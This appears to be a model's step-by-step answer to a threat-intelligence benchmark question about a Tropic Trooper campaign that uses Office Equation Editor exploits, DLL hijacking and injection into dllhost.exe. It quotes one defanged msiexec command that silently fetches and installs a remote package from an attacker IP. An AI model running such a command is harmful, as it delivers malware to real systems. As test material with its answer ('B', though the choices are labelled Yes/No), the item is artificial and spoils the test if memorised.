Alright, I have this CTI outline about a cyber attack attributed to Tropic Trooper, also known as KeyBoy. The outline describes the attack sequence using MITRE ATT&CK tactics, and there's some additional context about the threat actor. Then, there's a question asking whether, after using Equation Editor exploits to execute an installer package with malicious payloads, Tropic Trooper is likely to drop RegAsm.exe onto systems for performing malicious activity before injecting a malicious DLL backdoor into dllhost.exe to facilitate their attack. The answer choices are simply "Yes" or "No."

First, I need to understand the attack sequence as described in the CTI outline. Let's break it down step by step.

**Initial Access:**

- Tropic Trooper uses exploits for CVE-2017-11882 or CVE-2018-0802, which are vulnerabilities in Microsoft Office's Equation Editor (EQNEDT32.EXE).

- Through these exploits, they execute commands to download and install an installer package (.msi) on the target system using the command: `/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]`.

So, the initial access vector is malicious Microsoft Office documents that exploit vulnerabilities in the Equation Editor to execute commands and install malware.

**Execution:**

- The system configuration file (in.sys) drops a backdoor installer (UserInstall.exe) and then deletes itself.

- UserInstall.exe drops a normal sidebar.exe file (a Windows Gadget tool), a malicious loader (wab32res.dll placed in "C:\ProgramData\Apple\Update\wab32res.dll"), and an encrypted configuration file.

- UserInstall.exe abuses the BITSadmin command-line tool to create a job and launch sidebar.exe.

- The malicious loader uses DLL hijacking on sidebar.exe to launch dllhost.exe (a normal file).

- The loader then injects a DLL backdoor into dllhost.exe.

- Additionally, there are malicious documents that don't need to download anything from the internet, as the backdoor dropper is already embedded in the document.

So, the execution phase involves installing a backdoor through an MSI installer, dropping various files, and using legitimate tools and processes to execute malicious code.

**Persistence:**

- The backdoor loads and decrypts an encrypted configuration file.

- It uses SSL to connect to command-and-control (C&C) servers.

This suggests that the backdoor establishes persistent access to the target system by maintaining communication with the C&C server.

**Command and Control:**

- The backdoor, referred to as TClient, uses SSL to communicate with the C&C server.

- C&C server addresses and other configuration values are not hardcoded, allowing the operators to easily change or update them.

- TClient uses symmetric encryption to decrypt its configuration with a 16-byte key and custom SSL libraries to connect to the C&C server.

This indicates that the command and control mechanism is designed to be flexible and evade detection by using encryption and non-static configurations.

**Others:**

- Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware, often disguising them as job vacancies in sensitive organizations.

- The MSI file contains PDB strings indicating it's part of a development project, possibly named "Apple."

- The installation process drops files into `C:\ProgramData\Apple\Update\` and creates a hidden directory (UFile).

- They use DLL hijacking to load the malicious wab32res.dll through a benign file (sidebar.exe) to evade antivirus detection.

- Reverse analysis of TClient allowed researchers to decrypt the C&C information.

- The C&C server uses SSL certificates that are recently registered and set to expire after a year, suggesting a strategy to minimize traces by using time-limited components.

Now, with this understanding of the attack sequence, let's look at the question:

"After using Equation Editor exploits to execute an installer package with malicious payloads, is Tropic Trooper likely to drop RegAsm.exe onto systems for performing malicious activity before injecting a malicious DLL backdoor into dllhost.exe to facilitate their attack?"

And the answer choices are "Yes" or "No."

So, the question is asking whether RegAsm.exe is dropped and used for malicious activity as part of this attack sequence, specifically before injecting a malicious DLL into dllhost.exe.

First, I need to recall what RegAsm.exe is. RegAsm is a legitimate Microsoft tool, the .NET Framework Registrar, used to register .NET assemblies for use in COM interop scenarios. It's a standard part of the .NET Framework and is used to make .NET components accessible to COM clients.

In the context of malware, RegAsm.exe can sometimes be abused by attackers to register malicious DLLs or to execute code in a way that might evade detection, since it's a signed Microsoft executable.

Looking back at the CTI outline, I need to see if RegAsm.exe is mentioned or if there's any indication that it's used in this attack sequence.

Scanning through the outline:

- Initial Access: mentions Equation Editor exploits and the execution of an MSI installer via msiexec.

- Execution: talks about the installer dropping UserInstall.exe, which in turn drops sidebar.exe, wab32res.dll, and an encrypted config file. It also mentions the use of BITSadmin to create a job and launch sidebar.exe.

- The malicious loader uses DLL hijacking on sidebar.exe to launch dllhost.exe and injects a malicious DLL into it.

- There's no mention of RegAsm.exe in the entire outline.

Given that, it seems that RegAsm.exe is not part of this particular attack sequence as described in the CTI outline.

However, I should consider whether, in general, Tropic Trooper might use RegAsm.exe in their tactics, even if it's not mentioned in this specific outline.

Looking at the "Others" section, it mentions that Tropic Trooper uses exploit-laden Microsoft Office documents and abuses components or services that expire to minimize traces.

But again, there's no reference to RegAsm.exe.

It's also worth noting that the attack sequence described uses other legitimate tools and processes, like msiexec, BITSadmin, sidebar.exe, and dllhost.exe, for their operations.

So, it's possible that Tropic Trooper might use RegAsm.exe in other campaigns or scenarios, but based on this specific outline, there's no indication that it's used in this particular attack sequence.

Therefore, the answer to the question should be "No," because RegAsm.exe is not mentioned or implied to be used in the attack sequence described in the CTI outline.

But, to be thorough, I should consider if there's any indirect evidence or implication that RegAsm.exe might be used.

For example, the outline mentions that the malicious loader drops wab32res.dll and injects it into dllhost.exe.

Is there any scenario where RegAsm.exe might be involved in this process?

RegAsm.exe is used to register .NET assemblies for COM interop.

If the malicious DLL is a .NET assembly and needs to be accessible via COM, then perhaps RegAsm.exe could be used to register it.

However, in the described attack sequence, the malicious loader directly injects the DLL into dllhost.exe.

Dllhost.exe is a legitimate Microsoft process that hosts in-procedure servers, and it can load DLLs without necessarily requiring them to be registered via RegAsm.exe.

Moreover, if the malicious DLL is designed to be loaded directly by dllhost.exe through process injection, it might not need to be registered with RegAsm.exe.

Therefore, even considering potential uses of RegAsm.exe in such scenarios, the specific steps outlined do not include its use.

Hence, based on the information provided in the CTI outline, it's unlikely that Tropic Trooper drops RegAsm.exe for performing malicious activity before injecting a malicious DLL into dllhost.exe in this particular attack sequence.

**Final Answer: B**
